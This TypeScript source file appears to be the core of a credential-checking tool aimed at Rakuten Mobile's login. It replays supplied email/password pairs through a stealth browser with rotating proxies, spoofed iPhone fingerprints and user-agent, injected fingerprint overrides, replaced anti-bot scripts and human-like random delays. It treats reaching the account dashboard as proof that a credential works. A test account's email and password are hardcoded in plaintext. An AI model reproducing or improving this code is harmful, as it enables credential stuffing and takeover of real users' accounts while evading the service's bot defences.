import { chromium } from "patchright";
import IVerifyService from "../../application/ports/IVerifyService";
import { Credential } from "../../core/entities/Credential";
import UserAgent from "user-agents"
import { sleep, IPhoneDevice, createGPUSpoofScript } from "../../utils";
import { Page, devices, Route } from "patchright";
import IProxyRepository from "../../core/repositories/IProxyRepository";
import { ICustomRatRepository } from "../../core/repositories/ICustomRatRepository";
import * as fs from "fs";
import * as path from "path";
import { createRatOverrideScript, CustomRat } from "../../utils/ratOverride";
import { extractDataUsage } from "../../utils/dataUsageExtractor";
import { WorkerContext } from "../../core/value-objects/WorkerContext";
import { getNextProxy, rotateProxyIndex } from "../../core/value-objects/WorkerProxyAssignment";
import { CustomRatSelector } from '../../application/services/CustomRatSelector';

const LOGIN_URL = 'https://login.account.rakuten.com/sso/authorize?client_id=rmn_app_web&redirect_uri=https://portal.mobile.rakuten.co.jp/auth/callback&ui_locales=ja-JP&state=redirect_uri%3Dhttps%253A%252F%252Fportal.mobile.rakuten.co.jp%252Fdashboard%26operation%3Dlogin%26service_id%3Drm001&scope=openid%20memberinfo_read_safebulk%20memberinfo_read_point%20memberinfo_get_card_token%201Hour@Access%2090days@Refresh&response_type=code&r10_required_claims=r10_name&r10_jid_service_id=rm001&r10_guest_login=true#/sign_in';

const TEST_ACCOUNT = {
  email: 'rindontaptap17@gmail.com',
  password: 'rindon17'
}

const MIN_DELAY_MS = 1000;
const MAX_DELAY_MS = 3000;

export default class PlaywrightVerify implements IVerifyService {
  // Default device type - change this to switch between devices
  private deviceType: IPhoneDevice = 'iphone-13';

  // Custom RAT for fingerprint override (loaded per request)
  private customRat?: any;  // Will be loaded per request

  // Map URL patterns to local file names
  private readonly localJsMap = new Map<string, string>([
    ['/widget/js/zxcvbn.js', 'zxcvbn.js'],
    ['/widget/js/UzBsVExITjBkWEJwWkNF-2.27.2.min.js', 'UzBsVExITjBkWEJwWkNF-2.27.2.min.js'],
  ]);

  // Track consecutive 400 errors per RAT hash
  private ratFailureMap = new Map<string, number>();

  constructor(
    private readonly proxyRepository: IProxyRepository,
    private customRatRepository: ICustomRatRepository,
    private customRatSelector: CustomRatSelector
  ) {}

  /**
   * Set the iPhone device type for GPU spoofing
   * Available: iphone-11, iphone-12, iphone-12-pro, iphone-13, iphone-13-pro,
   *            iphone-13-pro-max, iphone-14, iphone-14-pro, iphone-14-pro-max,
   *            iphone-15, iphone-15-pro, iphone-15-pro-max, custom
   */
  private setDeviceType(device: IPhoneDevice): void {
    this.deviceType = device;
  }

  /**
   * Get the assets directory path (works in both dev and bundled environments)
   */
  private getAssetsPath(): string {
    return path.join(process.cwd(), 'assets', 'js');
  }

  /**
   * Load a fresh RAT for each verification request using round-robin rotation
   */
  private async loadCustomRatForRequest(): Promise<any> {
    try {
      return await this.customRatSelector.getNextRat();
    } catch (error) {
      if (error instanceof Error && error.message.includes('No active RATs')) {
        console.error('[PlaywrightVerify] All RATs are DEAD. Cannot continue verification.');
        throw error;
      }
      return null;
    }
  }

  /**
   * Handle RAT failure by incrementing failure count and marking DEAD after 3 consecutive 400s
   */
  private async handleRatFailure(ratHash: string): Promise<void> {
    const currentCount = this.ratFailureMap.get(ratHash) || 0;
    const newCount = currentCount + 1;
    this.ratFailureMap.set(ratHash, newCount);

    if (newCount >= 3) {
      await this.customRatRepository.markAsDeadByHash(ratHash);
      console.error(`[PlaywrightVerify] RAT ${ratHash} marked DEAD after 3 consecutive 400s`);
      this.ratFailureMap.delete(ratHash);
    }
  }

  /**
   * Handle RAT success by resetting failure counter
   */
  private async handleRatSuccess(ratHash: string): Promise<void> {
    if (this.ratFailureMap.has(ratHash)) {
      await this.customRatRepository.resetFailureCount(ratHash);
      this.ratFailureMap.delete(ratHash);
    }
  }

  /**
   * Handle local JS file serving by intercepting specific requests
   */
  private async handleLocalJs(route: Route): Promise<void> {
    const request = route.request();
    const url = request.url();

    // Check if URL matches any pattern in localJsMap
    for (const [pattern, localFileName] of this.localJsMap) {
      if (url.includes(pattern)) {
        try {
          const assetsPath = this.getAssetsPath();
          const localFilePath = path.join(assetsPath, localFileName);

          if (fs.existsSync(localFilePath)) {
            const content = fs.readFileSync(localFilePath, 'utf-8');
            await route.fulfill({
              status: 200,
              contentType: 'application/javascript',
              body: content,
            });
            console.log(`[Local JS] Served ${pattern} from local: ${localFilePath}`);
            return;
          } else {
            console.warn(`[Local JS] File not found: ${localFilePath}, falling back to remote`);
          }
        } catch (err) {
          console.error(`[Local JS] Failed to load ${localFileName}:`, err);
          // Fall through to original request
        }
      }
    }

    // Continue to original request if no match or error
    await route.continue();
  }

  async verify(credential: Credential, context: WorkerContext): Promise<boolean> {
    if (credential.password.length < 8) {
      return false;
    }

    // Load fresh RAT for this request
    this.customRat = await this.loadCustomRatForRequest();

    const isDebug = process.env.AUTOMATE_DEBUG === 'true'
    const isStopForCheck =process.env.STOP_FOR_CHECK === 'true'

    const userAgentData = new UserAgent({
      deviceCategory: 'mobile',
      platform: 'iPhone'
    })

    const assignment = context.proxyAssignment;

    // Try each available proxy until one works or all fail
    const maxAttempts = assignment.proxies.length;
    let browser;
    let proxy = null;
    let launchSuccess = false;

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      // Select current proxy based on index
      proxy = getNextProxy(assignment);

      if (!proxy) {
        throw new Error(`Worker ${context.workerId}: No proxy available`);
      }

      try {
        browser = await chromium.launch({
          channel: "chrome",
          headless: false,
          args: [
            '--no-sandbox',
            '--disable-blink-features=AutomationControlled',
            '--hide-scrollbars',
            '--disable-infobars',
            '--window-position=0,0',
            '--ignore-certificate-errors',
            '--disable-gpu-shader-disk-cache',
          ],
          proxy: {
            server: proxy.server,
            username: proxy.username ?? void 0,
            password: proxy.password ?? void 0
          }
        });
        launchSuccess = true;
        break; // Success, exit the retry loop
      } catch (error) {
        console.error(`[PlaywrightVerify] Failed to launch browser with proxy ${proxy.server}:`, error);

        // Mark proxy as DEAD since launch failed
        await this.proxyRepository.markProxyDead(proxy.id);
        console.error(`[PlaywrightVerify] Marked proxy ${proxy.server} (id: ${proxy.id}) as DEAD`);

        // Rotate to next proxy in local assignment
        rotateProxyIndex(assignment);

        // If this was the last attempt, rethrow the error
        if (attempt === maxAttempts - 1) {
          throw new Error(`All ${maxAttempts} proxies failed during browser launch. Last error: ${error.message}`);
        }
      }
    }

    if (!launchSuccess || !browser) {
      throw new Error(`Worker ${context.workerId}: Failed to launch browser with any proxy`);
    }

    const browserContext = await browser.newContext({
      viewport: { width: 390, height: 844 },
      deviceScaleFactor: 3,
      isMobile: true,
      hasTouch: true,
      locale: "en-US",
      timezoneId: "Asia/Bangkok",
    });

    const page = await browserContext.newPage();

    // Inject RatOverride if custom RAT is set
    if (this.customRat) {
      const ratOverrideScript = createRatOverrideScript(this.customRat);
      await page.addInitScript(ratOverrideScript);
      console.log('[RatOverride] Script injected with custom RAT:', this.customRat.hash);
    }

    // Enable local JS file routing for specific files
    await page.route('**/*.js', (route) => this.handleLocalJs(route));

    // Apply GPU spoofing based on device type
    // await this.applyGPUSpoofing(page);

    const client = await browserContext.newCDPSession(page);

    await client.send('Emulation.setUserAgentOverride', {
      userAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
      platform: "iPhone",
      acceptLanguage: "ja-JP",
      userAgentMetadata: {
        mobile: true,
        platform: "iOS",
        platformVersion: "16.6",
        architecture: "",
        model: "iPhone 13",
        brands: [
          { brand: "Apple", version: "16" },
          { brand: "Chromium", version: "119" }
        ]
      }
    });

    await client.send('Emulation.setTouchEmulationEnabled', {
        enabled: true,
        maxTouchPoints: 5, // Ép cứng số điểm chạm là 5
    });

    await client.send('Emulation.setHardwareConcurrencyOverride', {
        hardwareConcurrency: 6,
    });


    if (isDebug && isStopForCheck) {
      await page.goto(LOGIN_URL);

      await sleep(1000000000)
    }

    try {
      // Retry flow for /v2/login/start 400 errors
      let maxRetries = 3;
      let loginStartSuccess = false;

      await page.goto(LOGIN_URL);
      await page.waitForLoadState('networkidle');
      await this.randomDelay();

      for (let attempt = 0; attempt < maxRetries; attempt++) {
        await page.locator('#user_id').fill(isDebug ? TEST_ACCOUNT.email : credential.email);
        await this.randomDelay();

        const nextButton1 = await page.locator('[class*="button__submit"]').first();
        await nextButton1.waitFor({ state: 'visible', timeout: 5000 });

        // Watch for /v2/login/start response
        const loginStartPromise = page.waitForResponse(response =>
          response.url().includes('/v2/login/start')
        );

        await this.randomDelay();
        await nextButton1.click();
        await page.waitForLoadState('networkidle');

        const loginStartResponse = await loginStartPromise;
        if (loginStartResponse.status() === 400) {
          const ratHash = this.customRat?.hash;
          if (ratHash) {
            await this.handleRatFailure(ratHash);
          }
          console.log(`[Login Start] Got 400, retrying... (Attempt ${attempt + 1}/${maxRetries})`);
          await page.reload();
          await page.waitForLoadState('networkidle');
          await this.randomDelay();
          continue;
        } else if (loginStartResponse.status() >= 200 && loginStartResponse.status() < 500) {
          const ratHash = this.customRat?.hash;
          if (ratHash) {
            await this.handleRatSuccess(ratHash);
          }
        }

        loginStartSuccess = true;
        break;
      }

      if (!loginStartSuccess) {
        console.log('[Login Start] Max retries reached, giving up');
        return false;
      }

      // if (isDebug) {
      //   await sleep(1000000000)
      // }

      await page.waitForURL('**/sign_in/password');
      await this.randomDelay();

      await page.locator('#password_current').fill(isDebug ? TEST_ACCOUNT.password : credential.password);
      await page.waitForLoadState('networkidle');
      await this.randomDelay();

      const nextButton = await page.locator('[class*="button__submit"]').nth(1);

      await nextButton.waitFor({ state: 'visible', timeout: 5000 });

      const loginResponsePromise = page.waitForResponse(response =>
        response.url().includes('/v2/login/complete') &&
        response.request().method() === 'POST'
      );

      await this.randomDelay();
      await nextButton.click()

      const loginResponse = await loginResponsePromise
      if (loginResponse.status() === 400) {
        const ratHash = this.customRat?.hash;
        if (ratHash) {
          await this.handleRatFailure(ratHash);
        }
      }

      if (loginResponse.status() !== 200) {
        if (isDebug && isStopForCheck) {
          console.log('Login failed')
          await sleep(1000000000)
        }
        return false
      }

      await page.waitForURL((url) => url.pathname === '/dashboard', { timeout: 30_000 });
      console.log('success load dashboard')

      const isDataUsageBoxVisible = await this.checkDataUsageBox(page);
      if (!isDataUsageBoxVisible) {
        if (isDebug) {
          console.log('Data usage box not found')
          await sleep(1000000000)
        }
        return false;
      }

      const isVerified = await this.checkDataUsageBox(page)

      if (isDebug) {
        console.log('Verify', isVerified)
        await sleep(1000000000)
      }

      return isVerified
    } catch (e) {
      return false;
    } finally {
      await browserContext.close();
      await browser.close();

      // Round-robin to next proxy if both are available
      rotateProxyIndex(assignment);
    }
  }

  private async checkDataUsageBox(page: Page, retryCount: number = 0): Promise<boolean> {
    try {
      console.log(`Checking Data Usage Box (Attempt ${retryCount + 1})...`);

      // Handle "You are already signed in" page if present
      await this.handleAlreadySignedInPage(page);

      // Now check for the data usage box
      const dataUsageBox = page.locator('rktn-home-data-usage[itemid="d_home_2"]');
      await dataUsageBox.waitFor({ state: 'visible', timeout: 15000 });
      return true;
    } catch (e) {
      if (retryCount < 4) {
        console.log("Element not found, reloading page...");

        if (page.url().includes('dashboard')) {
            await page.reload({ waitUntil: 'domcontentloaded' });
            await page.waitForTimeout(3000);
            return this.checkDataUsageBox(page, retryCount + 1);
        }
      }
      return false;
    }
  }

  /**
   * Check if the "You are already signed in" page is displayed
   * and handle it by clicking the Continue button
   */
  private async handleAlreadySignedInPage(page: Page): Promise<boolean> {
    const continueButton = page.locator('#prim_81').first();
    if (!(await continueButton.isVisible().catch(() => false))) return false
    await continueButton.click();
    await page.waitForLoadState('networkidle')
    return true;
  }

  /**
   * Introduce a random delay between actions to simulate human behavior
   */
  private async randomDelay(min: number = MIN_DELAY_MS, max: number = MAX_DELAY_MS): Promise<void> {
    const delay = Math.floor(Math.random() * (max - min + 1)) + min;
    // Only log in debug mode to reduce noise
    if (process.env.AUTOMATE_DEBUG === 'true') {
      console.log(`[RandomDelay] Sleeping for ${delay}ms`);
    }
    await sleep(delay);
  }

  /**
   * Apply GPU spoofing to the page based on the current device type
   * This overrides WebGL fingerprinting to match the selected iPhone device
   */
  private async applyGPUSpoofing(page: Page): Promise<void> {
    const spoofScript = createGPUSpoofScript(this.deviceType);
    await page.addInitScript(spoofScript);
    console.log(`[GPU Spoofing] Applied for device: ${this.deviceType}`);
  }
}
